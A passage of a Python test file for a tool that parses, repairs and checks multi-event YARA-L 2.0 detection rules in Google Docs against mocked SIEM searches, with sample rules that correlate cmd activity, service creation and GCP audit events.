    ft = FunctionTool(tools_module.verify_and_redline_yaral2_rules_in_doc)
    decl = ft._get_declaration()
    props = (decl.parameters_json_schema or {}).get("properties", {})
    assert "diagnose_zero_hit_retrohunt" in props
    assert "tool_context" not in props


def test_extract_yaral2_multi_event_spec_multiline_and_collapsed() -> None:
    """Verifies extraction of event_vars, per_event_udm_queries, join_bindings, match_clauses,
    and condition_tokens with exact 1-based UTF-16 spans on both multi-line and Drive-collapsed
    single-line multi-event YARA-L 2.0 rules."""
    from manager.tools.docs_review_tools import (
        _build_utf16_index_map,
        extract_yaral2_multi_event_spec,
    )

    multiline_rule = (
        "rule wins_d19_multi_stage {\n"
        "  meta:\n"
        '    author = "SecOps"\n'
        "  events:\n"
        '    $cmd.principal.hostname = "wins-d19"\n'
        "    re.regex($cmd.target.process.command_line, `.*cmd.*`) nocase\n"
        "    $cmd.principal.hostname = $host\n"
        "    re.regex($svc.target.process.command_line, `.*DERPService.*`) nocase\n"
        "    $svc.target.hostname = $host\n"
        "  match:\n"
        "    $host over 15m\n"
        "  condition:\n"
        "    $cmd and $svc\n"
        "}"
    )
    prefix = "Lead-in emoji \U0001f680 text:\n"
    full_text = prefix + multiline_rule
    idx_map = _build_utf16_index_map(full_text)

    spec = extract_yaral2_multi_event_spec(
        multiline_rule,
        rule_char_start=len(prefix),
        full_plain_text=full_text,
        index_map=idx_map,
    )
    assert spec["is_multi_event"] is True
    assert spec["event_vars"] == ["$cmd", "$svc"]
    assert spec["join_placeholders"] == ["$host"]
    assert spec["per_event_udm_queries"] == {
        "$cmd": 'principal.hostname = "wins-d19" AND target.process.command_line = /.*cmd.*/ nocase',
        "$svc": "target.process.command_line = /.*DERPService.*/ nocase",
    }
    assert len(spec["join_bindings"]) == 2
    jb0, jb1 = spec["join_bindings"]
    assert jb0["var_field_token"] == "$cmd.principal.hostname"
    assert jb0["semantic_type"] == "hostname"
    assert jb1["var_field_token"] == "$svc.target.hostname"
    assert jb1["semantic_type"] == "hostname"

    # Verify UTF-16 span of $svc.target.hostname in full_text
    expected_vf_pos = full_text.index("$svc.target.hostname")
    assert jb1["var_field_start_index"] == idx_map[expected_vf_pos]
    assert (
        jb1["var_field_end_index"]
        == idx_map[expected_vf_pos + len("$svc.target.hostname") - 1] + 1
    )

    assert len(spec["match_clauses"]) == 1
    mc = spec["match_clauses"][0]
    assert mc["placeholder_var"] == "$host"
    assert mc["window_raw"] == "over 15m"
    assert mc["window_valid"] is True
    assert mc["window_normalized"] == "over 15m"

    assert [ct["token_text"] for ct in spec["condition_tokens"]] == ["$cmd", "$svc"]
    assert spec["condition_span"]["condition_text"] == "$cmd and $svc"

    # Drive-collapsed single-line multi-event rule
    collapsed_rule = " ".join(
        line.strip() for line in multiline_rule.splitlines() if line.strip()
    )
    spec_collapsed = extract_yaral2_multi_event_spec(collapsed_rule)
    assert spec_collapsed["is_multi_event"] is True
    assert spec_collapsed["event_vars"] == ["$cmd", "$svc"]
    assert spec_collapsed["per_event_udm_queries"] == spec["per_event_udm_queries"]
    assert len(spec_collapsed["join_bindings"]) == 2
    assert spec_collapsed["match_clauses"][0]["window_valid"] is True
    assert [ct["token_text"] for ct in spec_collapsed["condition_tokens"]] == [
        "$cmd",
        "$svc",
    ]


def test_find_yaral2_rule_spans_detects_multi_event_join_match_and_condition_defects() -> None:
    """Verifies exact UTF-16 span detection and repaired_rule_text generation for
    match_placeholder_mismatch, invalid_match_window_syntax, cross_event_join_type_mismatch,
    and multi_event_condition_mismatch (both undeclared variable and omitted variable)."""
    from manager.tools.docs_review_tools import (
        _build_utf16_index_map,
        find_yaral2_rule_spans,
    )

    doc_text = (
        "rule gcp_iam_to_cloudsql_destructive_chain {\n"
        "  meta:\n"
        '    author = "SecOps Autonomous Agent"\n'
        "  strings:\n"
        '    $iam.log_type = "GCP_CLOUDAUDIT"\n'
        '    $iam.resource.name = "projects/base-production"\n'
        "    $iam.principal.ip = $ip\n"
        '    $sql.log_type = "GCP_CLOUDAUDIT"\n'
        "    $sql.principal.hostname = $ip\n"
        "  match:\n"
        "    $src_ip within 15 minutes\n"
        "  condition:\n"
        "    $iam and $sql_event\n"
        "}\n\n"
        "rule incomplete_multi_event_condition {\n"
        "  events:\n"
        '    $e1.metadata.event_type = "PROCESS_LAUNCH"\n'
        "    $e1.principal.ip = $actor_ip\n"
        '    $e2.metadata.event_type = "NETWORK_CONNECTION"\n'
        "    $e2.principal.ip = $actor_ip\n"
        "  match:\n"
        "    $actor_ip over 1 hour\n"
        "  condition:\n"
        "    $e1\n"
        "}\n"
    )
    idx_map = _build_utf16_index_map(doc_text)
    comments, edits, findings = find_yaral2_rule_spans(doc_text, idx_map)

    r1_findings = [
        f
        for f in findings
        if f["rule_name"] == "gcp_iam_to_cloudsql_destructive_chain"
    ]
    assert [f["defect_type"] for f in r1_findings] == [
        "yara_strings_section",
        "invalid_udm_field",
        "invalid_udm_field",
        "invalid_udm_field",
        "cross_event_join_type_mismatch",
        "match_placeholder_mismatch",
        "invalid_match_window_syntax",
        "multi_event_condition_mismatch",
    ]
    assert [
        (f["quote"], f["replacement"]) for f in r1_findings
    ] == [
        ("strings:", "events:"),
        ("$iam.log_type", "$iam.metadata.log_type"),
        ("$iam.resource.name", "$iam.target.resource.name"),
        ("$sql.log_type", "$sql.metadata.log_type"),
        ("$sql.principal.hostname", "$sql.principal.ip"),
        ("$src_ip", "$ip"),
        ("within 15 minutes", "over 15m"),
        ("$sql_event", "$sql"),
    ]

    repaired_r1 = r1_findings[0]["repaired_rule_text"]
    assert "events:" in repaired_r1
    assert "$sql.principal.ip = $ip" in repaired_r1
    assert "$ip over 15m" in repaired_r1
    assert "$iam and $sql" in repaired_r1
    assert r1_findings[0]["is_multi_event"] is True

    # Rule 2: incomplete condition ($e1 -> $e1 and $e2) + verbose match window (over 1 hour -> over 1h)
    r2_findings = [
        f
        for f in findings
        if f["rule_name"] == "incomplete_multi_event_condition"
    ]
    assert [(f["defect_type"], f["quote"], f["replacement"]) for f in r2_findings] == [
        ("invalid_match_window_syntax", "over 1 hour", "over 1h"),
        ("multi_event_condition_mismatch", "$e1", "$e1 and $e2"),
    ]
    assert "$e1 and $e2" in r2_findings[0]["repaired_rule_text"]
    assert "over 1h" in r2_findings[0]["repaired_rule_text"]

    # Ensure no two edit spans overlap across the entire document
    sorted_edits = sorted(edits, key=lambda e: e["start_index"])
    for prev_e, next_e in zip(sorted_edits, sorted_edits[1:]):
        assert prev_e["end_index"] <= next_e["start_index"]


def test_verify_yaral2_rule_with_siem_multi_event_per_stream_correlation() -> None:
    """Verifies that verify_yaral2_rule_with_siem executes separate search_udm calls per event
    variable ($iam, $sql), computes shared_join_values across streams, and reports
    correlated_event_count > 0 without falsely merging $iam and $sql into one impossible query."""
    from manager.tools.docs_review_tools import verify_yaral2_rule_with_siem

    rule_text = (
        "rule gcp_iam_to_cloudsql_destructive_chain {\n"
        "  meta:\n"
        '    author = "SecOps Autonomous Agent"\n'
        "  strings:\n"
        '    $iam.log_type = "GCP_CLOUDAUDIT"\n'
        '    $iam.resource.name = "projects/base-production"\n'
        "    $iam.principal.ip = $ip\n"
        '    $sql.log_type = "GCP_CLOUDAUDIT"\n'
        "    $sql.principal.hostname = $ip\n"
        "  match:\n"
        "    $src_ip within 15 minutes\n"
        "  condition:\n"
        "    $iam and $sql_event\n"
        "}"
    )

    queried_streams: list[str] = []

    def fake_validate(rule_text: str) -> str:
        assert "events:" in rule_text
        assert "$sql.principal.ip = $ip" in rule_text
        assert "$ip over 15m" in rule_text
        assert "$iam and $sql" in rule_text
        return "Rule validation PASSED."

    def fake_search(query: str, **kwargs: Any) -> dict[str, Any]:
        queried_streams.append(query)
        if 'target.resource.name = "projects/base-production"' in query:
            return {
                "events": [
                    {
                        "udm": {
                            "metadata": {"log_type": "GCP_CLOUDAUDIT"},
                            "principal": {"ip": ["104.198.226.161"]},
                            "target": {"resource": {"name": "projects/base-production"}},
                        }
                    }
                ],
                "total_events": 1,
            }
        if query == 'metadata.log_type = "GCP_CLOUDAUDIT"':
            return {
                "events": [
                    {
                        "udm": {
                            "metadata": {"log_type": "GCP_CLOUDAUDIT"},
                            "principal": {"ip": ["104.198.226.161"]},
                        }
                    }
                    for _ in range(9)
                ],
                "total_events": 9,
            }
        return {"events": [], "total_events": 0}

    res = verify_yaral2_rule_with_siem(
        rule_text,
        run_retrohunt_check=True,
        siem_validate_fn=fake_validate,
        siem_search_fn=fake_search,
    )
    assert res["status"] == "success"
    assert res["is_multi_event"] is True
    assert res["compiler_verified"] is True
    assert res["retrohunt_verified"] is True
    assert res["retrohunt_event_count"] == 10
    assert len(queried_streams) == 2
    me_retro = res["multi_event_retrohunt"]
    assert me_retro["per_event_counts"] == {"$iam": 1, "$sql": 9}
    assert me_retro["shared_join_values"] == ["104.198.226.161"]
    assert me_retro["correlated_event_count"] == 10


def test_diagnose_zero_hit_yaral2_rule_multi_event_join_entity_role_swap() -> None:
    """Verifies that when $cmd and $svc both match events individually in Chronicle SIEM
    but have 0 shared join values because $svc used $svc.target.hostname = $host instead of
    $svc.principal.hostname = $host, diagnose_zero_hit_yaral2_rule pivots $svc's join binding
    to $svc.principal.hostname, compiles the pivoted rule, and computes correlated_event_count."""
    from manager.tools.docs_review_tools import diagnose_zero_hit_yaral2_rule

    rule_text = (
        "rule wins_d19_lolbin_to_derpservice_correlation {\n"
        "  meta:\n"
        '    author = "SecOps Autonomous Agent"\n'
        "  events:\n"
        '    $cmd.principal.hostname = "wins-d19"\n'
        "    re.regex($cmd.target.process.command_line, `.*cmd.*`) nocase\n"
        "    $cmd.principal.hostname = $host\n"
        "    re.regex($svc.target.process.command_line, `.*DERPService.*`) nocase\n"
        "    $svc.target.hostname = $host\n"
        "  match:\n"
        "    $host over 15m\n"
        "  condition:\n"
        "    $cmd and $svc\n"
        "}"
    )

    validated_rules: list[str] = []

    def fake_validate(rule_text: str) -> str:
        validated_rules.append(rule_text)
        return "Rule validation PASSED."

    def fake_search(query: str, **kwargs: Any) -> dict[str, Any]:
        if "DERPService" in query:
            return {
                "events": [
                    {
                        "udm": {
                            "principal": {"hostname": "wins-d19"},
                            "target": {
                                "process": {
                                    "command_line": "C:\\Users\\Administrator\\DERPService.exe"
                                }
                            },
                        }
                    }
                ],
                "total_events": 1,
            }
        if 'principal.hostname = "wins-d19"' in query:
            return {
                "events": [
                    {
                        "udm": {
                            "principal": {"hostname": "wins-d19"},
                            "target": {
                                "process": {
                                    "command_line": 'C:\\Windows\\system32\\cmd.exe /c "sc create DERPService"'
                                }
                            },
                        }
                    }
                    for _ in range(10)
                ],
                "total_events": 10,
            }
        return {"events": [], "total_events": 0}

    diag = diagnose_zero_hit_yaral2_rule(
        rule_text,
        siem_validate_fn=fake_validate,
        siem_search_fn=fake_search,
    )
    assert diag["status"] == "success"
    assert diag["is_multi_event"] is True
    assert diag["zero_hit"] is True
    assert diag["diagnosis_class"] == "cross_event_join_entity_role_swap"
    assert diag["recommended_field"] == "principal.hostname"
    assert diag["recommended_span_target"] == "var_field"
    assert diag["recommended_span_replacement"] == "$svc.principal.hostname"
    assert diag["recommended_yaral2_predicate"] == "$svc.principal.hostname = $host"
    assert "$svc.principal.hostname = $host" in diag["pivoted_rule_text"]
    assert "$svc.target.hostname" not in diag["pivoted_rule_text"]
    assert diag["pivot_verified"] is True
    assert diag["pivot_compiler_verified"] is True
    assert diag["pivot_event_count"] == 11
    assert diag["shared_join_values"] == ["wins-d19"]
    assert any("$svc.principal.hostname = $host" in r for r in validated_rules)


def test_verify_and_redline_yaral2_rules_in_doc_multi_event_end_to_end_and_idempotency() -> None:
    """Verifies end-to-end Google Docs API v1 batchUpdate ordering (comments first,
    descending-index writeMode="SUGGEST" replacements second) across static multi-event defects,
    zero-hit cross_event_join_entity_role_swap diagnosis, valid multi-event control preservation,
    and Pass 2 idempotency."""
    from manager.tools.docs_review_tools import (
        clear_doc_index_cache,
        verify_and_redline_yaral2_rules_in_doc,
    )

    clear_doc_index_cache()

    doc_text = (
        "# Multi-Event YARA-L 2.0 Detection Rules\n\n"
        "rule gcp_iam_to_cloudsql_destructive_chain {\n"
        "  meta:\n"
        '    author = "SecOps Autonomous Agent"\n'
        "  strings:\n"
        '    $iam.log_type = "GCP_CLOUDAUDIT"\n'
        '    $iam.resource.name = "projects/base-production"\n'
        "    $iam.principal.ip = $ip\n"
        '    $sql.log_type = "GCP_CLOUDAUDIT"\n'
        "    $sql.principal.hostname = $ip\n"
        "  match:\n"
        "    $src_ip within 15 minutes\n"
        "  condition:\n"
        "    $iam and $sql_event\n"
        "}\n\n"
        "rule wins_d19_lolbin_to_derpservice_correlation {\n"
        "  meta:\n"
        '    author = "SecOps Autonomous Agent"\n'
        "  events:\n"
        '    $cmd.principal.hostname = "wins-d19"\n'
        "    re.regex($cmd.target.process.command_line, `.*cmd.*`) nocase\n"
        "    $cmd.principal.hostname = $host\n"
        "    re.regex($svc.target.process.command_line, `.*DERPService.*`) nocase\n"
        "    $svc.target.hostname = $host\n"
        "  match:\n"
        "    $host over 15m\n"
        "  condition:\n"
        "    $cmd and $svc\n"
        "}\n\n"
        "rule wins_d19_verified_multi_event_baseline {\n"
        "  meta:\n"
        '    author = "SecOps Autonomous Agent"\n'
        "  events:\n"
        '    $e1.principal.hostname = "wins-d19"\n'
        "    re.regex($e1.target.process.command_line, `.*cmd.*`) nocase\n"
        "    $e1.principal.hostname = $host\n"
        "    re.regex($e2.target.process.command_line, `.*DERPService.*`) nocase\n"
        "    $e2.principal.hostname = $host\n"
        "  match:\n"
        "    $host over 15m\n"
        "  condition:\n"
        "    $e1 and $e2\n"
        "}\n"
    )

    mock_doc = {
        "documentId": "doc-multi-event-yl2",
        "title": "Multi-Event YARA-L 2.0 Correlation Test",
        "body": {
            "content": [
                {
                    "paragraph": {
                        "elements": [
                            {
                                "startIndex": 1,
                                "endIndex": len(doc_text) + 1,
                                "textRun": {"content": doc_text},
                            }
                        ]
                    }
                }
            ]
        },
    }
    batch_calls: list[dict[str, Any]] = []

    def handler(request: httpx.Request) -> httpx.Response:
        if request.method == "GET":
            return httpx.Response(200, json=mock_doc)
        payload = json.loads(request.content.decode("utf-8"))
        batch_calls.append(payload)
        if any("insertComment" in r for r in payload.get("requests", [])):
            return httpx.Response(
                200,
                json={
                    "replies": [
                        {"insertComment": {"commentId": f"c-me-{i}"}}
                        for i, _ in enumerate(payload["requests"])
                    ]
                },
            )
        return httpx.Response(
            200,
            json={"replies": [{} for _ in payload.get("requests", [])]},
        )

    def fake_validate(rule_text: str) -> str:
        return "Rule validation PASSED."

    def fake_search(query: str, **kwargs: Any) -> dict[str, Any]:
        if "GCP_CLOUDAUDIT" in query:
            return {
                "events": [
                    {
                        "udm": {
                            "metadata": {"log_type": "GCP_CLOUDAUDIT"},
                            "principal": {"ip": ["104.198.226.161"]},
                            "target": {"resource": {"name": "projects/base-production"}},
                        }
                    }
                    for _ in range(5)
                ],
                "total_events": 5,
            }
        if "DERPService" in query:
            return {
                "events": [
                    {
                        "udm": {
                            "principal": {"hostname": "wins-d19"},
                            "target": {
                                "process": {
                                    "command_line": "C:\\Users\\Administrator\\DERPService.exe"
                                }
                            },
                        }
                    }
                ],
                "total_events": 1,
            }
        if 'principal.hostname = "wins-d19"' in query:
            return {
                "events": [
                    {
                        "udm": {
                            "principal": {"hostname": "wins-d19"},
                            "target": {
                                "process": {
                                    "command_line": "C:\\Windows\\system32\\cmd.exe /c whoami"
                                }
                            },
                        }
                    }
                    for _ in range(10)
                ],
                "total_events": 10,
            }
        return {"events": [], "total_events": 0}

    res = verify_and_redline_yaral2_rules_in_doc(
        "doc-multi-event-yl2",
        run_live_siem_check=True,
        diagnose_zero_hit_retrohunt=True,
        siem_validate_fn=fake_validate,
        siem_search_fn=fake_search,
        token_source=StaticTokenSource("adc-token"),
        transport=httpx.MockTransport(handler),
    )
    assert res["status"] == "success"
    # 8 static findings on Rule 1 + 1 zero-hit join swap on Rule 2 + 0 on Rule 3 = 9
    assert res["yaral2_findings_count"] == 9
    assert res["zero_hit_yaral2_findings_count"] == 1
    assert res["skipped_existing_suggestion_count"] == 0
    assert res["comments"]["inserted_count"] == 9
    assert res["edits"]["applied_count"] == 9

    rule_names_with_findings = {f["rule_name"] for f in res["findings"]}
    assert "wins_d19_verified_multi_event_baseline" not in rule_names_with_findings

    zh_findings = [f for f in res["findings"] if f.get("zero_hit_diagnosis")]
    assert len(zh_findings) == 1
    assert zh_findings[0]["zero_hit_diagnosis"] == "cross_event_join_entity_role_swap"
    assert zh_findings[0]["quote"] == "$svc.target.hostname"
    assert zh_findings[0]["replacement"] == "$svc.principal.hostname"
    assert zh_findings[0]["shared_join_values"] == ["wins-d19"]

    assert len(batch_calls) == 2
    assert "writeControl" not in batch_calls[0]
    assert batch_calls[1]["writeControl"] == {"writeMode": "SUGGEST"}
    delete_starts = [
        req["deleteContentRange"]["range"]["startIndex"]
        for req in batch_calls[1]["requests"]
        if "deleteContentRange" in req
    ]
    assert delete_starts == sorted(delete_starts, reverse=True)

    # Pass 2 idempotency with pending suggestions covering the document -> 0 new edits, 9 skipped
    mock_doc_pending = {
        "documentId": "doc-multi-event-yl2",
        "title": "Multi-Event YARA-L 2.0 Correlation Test",
        "body": {
            "content": [
                {
                    "paragraph": {
                        "elements": [
                            {
                                "startIndex": 1,
                                "endIndex": len(doc_text) + 1,
                                "textRun": {
                                    "content": doc_text,
                                    "suggestedDeletionIds": [
                                        "suggest.yl2.me.existing"
                                    ],
                                },
                            }
                        ]
                    }
                }
            ]
        },
    }
    batch_calls.clear()
    res2 = verify_and_redline_yaral2_rules_in_doc(
        "doc-multi-event-yl2",
        run_live_siem_check=True,
        diagnose_zero_hit_retrohunt=True,
        siem_validate_fn=fake_validate,
        siem_search_fn=fake_search,
        token_source=StaticTokenSource("adc-token"),
        transport=httpx.MockTransport(
            lambda req: httpx.Response(200, json=mock_doc_pending)
        ),
    )
    assert res2["status"] == "success"
    assert res2["yaral2_findings_count"] == 0
    assert res2["zero_hit_yaral2_findings_count"] == 0
    assert res2["skipped_existing_suggestion_count"] == 9
    assert res2["comments"]["inserted_count"] == 0
    assert res2["edits"]["applied_count"] == 0
    assert len(batch_calls) == 0


def test_extract_yaral2_multi_event_spec_parses_outcome_bindings_and_non_existence_condition() -> None:
    """Verifies parsing of outcome: variables, aggregation functions, referenced event fields,
    and positive_event_vars vs. negated_event_vars (!$e2 and not $e2) across multi-line
    and Drive-collapsed single-line rules with exact 1-based UTF-16 spans."""
    from manager.tools.docs_review_tools import (
        _build_utf16_index_map,
        extract_yaral2_multi_event_spec,
    )

    multi_line_rule = (
        "rule gcp_iam_unapproved_privilege_escalation {\n"
        "  meta:\n"
        '    author = "SecOps Autonomous Agent"\n'
        "  events:\n"
        '    $iam.metadata.log_type = "GCP_CLOUDAUDIT"\n'
        '    $iam.target.resource.name = "projects/base-production"\n'
        "    $iam.principal.ip = $src_ip\n"
        '    $approval.metadata.log_type = "WORKSPACE_ACTIVITY"\n'
        "    $approval.principal.ip = $src_ip\n"
        "  match:\n"
        "    $src_ip over 15m\n"
        "  outcome:\n"
        "    $risk_score = max(85)\n"
        "    $event_count = distinct_count($iam.metadata.id)\n"
        "    $target_resources = $iam.resource.name\n"
        "  condition:\n"
        "    $iam and not $approval and $event_count >= 1\n"
        "}"
    )

    prefix = "Header prefix:\n"
    full_text = prefix + multi_line_rule
    idx_map = _build_utf16_index_map(full_text)
    spec = extract_yaral2_multi_event_spec(
        multi_line_rule,
        rule_char_start=len(prefix),
        full_plain_text=full_text,
        index_map=idx_map,
    )
    assert spec["is_multi_event"] is True
    assert spec["event_vars"] == ["$iam", "$approval"]
    assert spec["outcome_vars"] == [
        "$risk_score",
        "$event_count",
        "$target_resources",
    ]
    assert spec["outcome_var_names"] == [
        "risk_score",
        "event_count",
        "target_resources",
    ]
    assert len(spec["outcome_bindings"]) == 3

    b0, b1, b2 = spec["outcome_bindings"]
    assert b0["outcome_var"] == "$risk_score"
    assert b0["func_name"] == "max"
    assert b0["is_aggregated"] is True

    assert b1["outcome_var"] == "$event_count"
    assert b1["func_name"] == "distinct_count"
    assert b1["is_aggregated"] is False
    assert b1["canonical_func_name"] == "count_distinct"
    assert b1["referenced_event_fields"] == ["$iam.metadata.id"]
    func_local_start = b1["func_local_start"]
    func_local_end = b1["func_local_end"]
    assert multi_line_rule[func_local_start:func_local_end] == "distinct_count"
    assert b1["func_start_index"] == idx_map[len(prefix) + func_local_start]

    assert b2["outcome_var"] == "$target_resources"
    assert b2["func_name"] is None
    assert b2["is_aggregated"] is False
    assert b2["referenced_event_fields"] == ["$iam.resource.name"]
    rhs_local_start = b2["rhs_local_start"]
    rhs_local_end = b2["rhs_local_end"]
    assert multi_line_rule[rhs_local_start:rhs_local_end] == "$iam.resource.name"
    assert b2["rhs_start_index"] == idx_map[len(prefix) + rhs_local_start]

    assert spec["positive_event_vars"] == ["$iam"]
    assert spec["negated_event_vars"] == ["$approval"]
    assert spec["is_non_existence"] is True
    assert len(spec["condition_negation_spans"]) == 1
    neg_span = spec["condition_negation_spans"][0]
    assert neg_span["quote"] == "not $approval"
    assert neg_span["replacement"] == "!$approval"

    cond_tokens_by_var = {t["var_token"]: t for t in spec["condition_tokens"]}
    assert cond_tokens_by_var["$iam"]["is_negated"] is False
    assert cond_tokens_by_var["$iam"]["in_comparison"] is False
    assert cond_tokens_by_var["$approval"]["is_negated"] is True
    assert cond_tokens_by_var["$event_count"]["in_comparison"] is True

    # Verify Drive-collapsed single-line rule with !$e2
    single_line_rule = (
        "rule single_line_non_existence { "
        'meta: author = "SecOps" '
        'events: $e1.metadata.log_type = "GCP_CLOUDAUDIT" $e1.principal.ip = $ip '
        '$e2.metadata.log_type = "WORKSPACE_ACTIVITY" $e2.principal.ip = $ip '
        "match: $ip over 15m "
        "outcome: $event_count = count_distinct($e1.metadata.id) "
        "condition: $e1 and !$e2 and $event_count >= 1 }"
    )
    sl_spec = extract_yaral2_multi_event_spec(single_line_rule)
    assert sl_spec["is_multi_event"] is True
    assert sl_spec["outcome_vars"] == ["$event_count"]
    assert sl_spec["positive_event_vars"] == ["$e1"]
    assert sl_spec["negated_event_vars"] == ["$e2"]
    assert sl_spec["is_non_existence"] is True
    assert sl_spec["condition_negation_spans"] == []


def test_find_yaral2_rule_spans_repairs_outcome_aggregations_condition_outcomes_and_negation_syntax() -> None:
    """Verifies detection and non-overlapping UTF-16 span repair of
    invalid_outcome_aggregation_function, unaggregated_outcome_in_match_rule
    (superseding inner invalid_udm_field edits), condition_outcome_variable_mismatch,
    invalid_condition_negation_syntax, and zero false positives on valid outcome: variables."""
    from manager.tools.docs_review_tools import (
        _build_utf16_index_map,
        find_yaral2_rule_spans,
    )

    doc_text = (
        "rule gcp_iam_unapproved_privilege_escalation {\n"
        "  meta:\n"
        '    author = "SecOps Autonomous Agent"\n'
        "  events:\n"
        '    $iam.metadata.log_type = "GCP_CLOUDAUDIT"\n'
        '    $iam.target.resource.name = "projects/base-production"\n'
        "    $iam.principal.ip = $src_ip\n"
        '    $approval.metadata.log_type = "WORKSPACE_ACTIVITY"\n'
        "    $approval.principal.ip = $src_ip\n"
        "  match:\n"
        "    $src_ip over 15m\n"
        "  outcome:\n"
        "    $risk_score = avg(85)\n"
        "    $event_count = distinct_count($iam.metadata.id)\n"
        "    $target_resources = $iam.resource.name\n"
        "  condition:\n"
        "    $iam and not $approval and $hit_count >= 1\n"
        "}\n\n"
        "rule valid_outcome_and_non_existence_control {\n"
        "  meta:\n"
        '    author = "SecOps Autonomous Agent"\n'
        "  events:\n"
        '    $iam.metadata.log_type = "GCP_CLOUDAUDIT"\n'
        "    $iam.principal.ip = $src_ip\n"
        '    $approval.metadata.log_type = "WORKSPACE_ACTIVITY"\n'
        "    $approval.principal.ip = $src_ip\n"
        "  match:\n"
        "    $src_ip over 15m\n"
        "  outcome:\n"
        "    $risk_score = max(85)\n"
        "    $event_count = count_distinct($iam.metadata.id)\n"
        "    $target_resources = array_distinct($iam.target.resource.name)\n"
        "  condition:\n"
        "    $iam and !$approval and $event_count >= 1 and $risk_score >= 50\n"
        "}\n"
    )

    idx_map = _build_utf16_index_map(doc_text)
    comments, edits, findings = find_yaral2_rule_spans(doc_text, idx_map)
    assert len(comments) == len(edits) == len(findings)
    rule_names = {s["rule_name"] for s in findings}
    assert "valid_outcome_and_non_existence_control" not in rule_names
    assert rule_names == {"gcp_iam_unapproved_privilege_escalation"}

    defect_types = [s["defect_type"] for s in findings]
    assert defect_types.count("invalid_outcome_aggregation_function") == 2
    assert defect_types.count("unaggregated_outcome_in_match_rule") == 1
    assert defect_types.count("invalid_condition_negation_syntax") == 1
    assert defect_types.count("condition_outcome_variable_mismatch") == 1
    # Inner invalid_udm_field on $iam.resource.name in outcome: must be superseded
    assert "invalid_udm_field" not in defect_types

    # Verify non-overlapping UTF-16 spans and exact descending-index reconstruction
    sorted_spans = sorted(findings, key=lambda s: int(s["start_index"]))
    for i in range(len(sorted_spans) - 1):
        assert int(sorted_spans[i]["end_index"]) <= int(
            sorted_spans[i + 1]["start_index"]
        )

    reconstructed = doc_text
    for s in sorted(
        findings, key=lambda item: int(item["start_index"]), reverse=True
    ):
        s_idx = int(s["start_index"]) - 1
        e_idx = int(s["end_index"]) - 1
        assert reconstructed[s_idx:e_idx] == s["quote"]
        assert idx_map[s_idx] == int(s["start_index"])
        reconstructed = (
            reconstructed[:s_idx] + str(s["replacement"]) + reconstructed[e_idx:]
        )

    assert "$risk_score = max(85)" in reconstructed
    assert "$event_count = count_distinct($iam.metadata.id)" in reconstructed
    assert (
        "$target_resources = array_distinct($iam.target.resource.name)"
        in reconstructed
    )
    assert "$iam and !$approval and $event_count >= 1" in reconstructed
    # After applying all spans, re-running find_yaral2_rule_spans produces 0 defects
    _, _, findings_after = find_yaral2_rule_spans(
        reconstructed, _build_utf16_index_map(reconstructed)
    )
    assert findings_after == []


def test_verify_yaral2_rule_with_siem_evaluates_non_existence_set_difference_retrohunt() -> None:
    """Verifies that _run_multi_event_siem_retrohunt and verify_yaral2_rule_with_siem
    compute positive_join_values - negated_join_values (shared_join_values and
    suppressed_join_values) when condition: $e1 and !$e2 is present."""
    from manager.tools.docs_review_tools import verify_yaral2_rule_with_siem

    non_existence_rule = (
        "rule gcp_iam_without_workspace_approval {\n"
        "  meta:\n"
        '    author = "SecOps Autonomous Agent"\n'
        "  events:\n"
        '    $iam.metadata.log_type = "GCP_CLOUDAUDIT"\n'
        '    $iam.target.resource.name = "projects/base-production"\n'
        "    $iam.principal.ip = $src_ip\n"
        '    $approval.metadata.log_type = "WORKSPACE_ACTIVITY"\n'
        "    $approval.principal.ip = $src_ip\n"
        "  match:\n"
        "    $src_ip over 15m\n"
        "  outcome:\n"
        "    $event_count = count_distinct($iam.metadata.id)\n"
        "    $target_resources = array_distinct($iam.target.resource.name)\n"
        "  condition:\n"
        "    $iam and !$approval and $event_count >= 1\n"
        "}"
    )

    def fake_validate(rule_text: str) -> str:
        return "Rule validation PASSED."

    def fake_search(query: str, **kwargs: Any) -> dict[str, Any]:
        if "GCP_CLOUDAUDIT" in query:
            return {
                "events": [
                    {
                        "udm": {
                            "metadata": {"log_type": "GCP_CLOUDAUDIT"},
                            "principal": {"ip": ["104.198.226.161"]},
                            "target": {
                                "resource": {"name": "projects/base-production"}
                            },
                        }
                    },
                    {
                        "udm": {
                            "metadata": {"log_type": "GCP_CLOUDAUDIT"},
                            "principal": {"ip": ["35.190.10.25"]},
                            "target": {
                                "resource": {"name": "projects/base-production"}
                            },
                        }
                    },
                ],
                "total_events": 2,
            }
        if "WORKSPACE_ACTIVITY" in query:
            # 35.190.10.25 has a matching approval event; 104.198.226.161 does NOT
            return {
                "events": [
                    {
                        "udm": {
                            "metadata": {"log_type": "WORKSPACE_ACTIVITY"},
                            "principal": {"ip": ["35.190.10.25"]},
                        }
                    }
                ],
                "total_events": 1,
            }
        return {"events": [], "total_events": 0}

    res = verify_yaral2_rule_with_siem(
        non_existence_rule,
        run_retrohunt_check=True,
        siem_validate_fn=fake_validate,
        siem_search_fn=fake_search,
    )
    assert res["status"] == "success"
    assert res["compiler_verified"] is True
    assert res["retrohunt_verified"] is True
    # Only the 1 unapproved event on 104.198.226.161 fires!
    assert res["retrohunt_event_count"] == 1
    me = res["multi_event_retrohunt"]
    assert me is not None
    assert me["is_multi_event"] is True
    assert me["is_non_existence"] is True
    assert me["positive_event_vars"] == ["$iam"]
    assert me["negated_event_vars"] == ["$approval"]
    assert me["shared_join_values"] == ["104.198.226.161"]
    assert me["suppressed_join_values"] == ["35.190.10.25"]


def test_diagnose_zero_hit_yaral2_rule_pivots_zero_hit_positive_stream_in_multi_event_and_non_existence_rules() -> None:
    """Verifies that when a positive stream in a multi-event or non-existence rule returns
    0 SIEM events (value_format_mismatch), diagnose_zero_hit_yaral2_rule ablates that stream's
    query, splices the repaired predicate into the rule, verifies compiler validity, and confirms
    correlated_event_count > 0."""
    from manager.tools.docs_review_tools import diagnose_zero_hit_yaral2_rule

    zero_hit_non_existence_rule = (
        "rule gcp_iam_unapproved_wrong_project_prefix {\n"
        "  meta:\n"
        '    author = "SecOps Autonomous Agent"\n'
        "  events:\n"
        '    $iam.metadata.log_type = "GCP_CLOUDAUDIT"\n'
        '    $iam.target.resource.name = "projects/base-analytics"\n'
        "    $iam.principal.ip = $src_ip\n"
        '    $approval.metadata.log_type = "WORKSPACE_ACTIVITY"\n'
        "    $approval.principal.ip = $src_ip\n"
        "  match:\n"
        "    $src_ip over 15m\n"
        "  outcome:\n"
        "    $event_count = count_distinct($iam.metadata.id)\n"
        "  condition:\n"
        "    $iam and !$approval and $event_count >= 1\n"
        "}"
    )

